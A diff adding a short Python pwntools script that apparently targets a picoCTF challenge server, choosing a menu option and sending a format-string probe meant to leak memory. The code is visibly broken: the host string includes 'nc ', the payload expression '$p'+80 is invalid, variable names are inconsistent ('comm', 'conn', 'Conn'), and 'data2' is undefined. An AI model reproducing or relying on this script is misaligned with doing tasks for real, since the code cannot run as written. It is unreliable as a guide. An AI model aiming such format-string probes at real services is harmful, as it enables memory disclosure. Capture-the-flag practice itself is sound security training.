@@ -1,0 +1,16 @@
+from pwn import *
+
+hostname = 'nc mercury.picoctf.net'
+port = 59616
+buf = '$p'+80
+comm = remote(hostname,port)
+data = conn.recv()
+data += conn.recv()
+conn.sendline('1')
+data += conn.recv()
+data += conn.recv()
+conn.sendline(buf)
+data += conn.recv()
+data2 += conn.recv()
+
+Conn.close
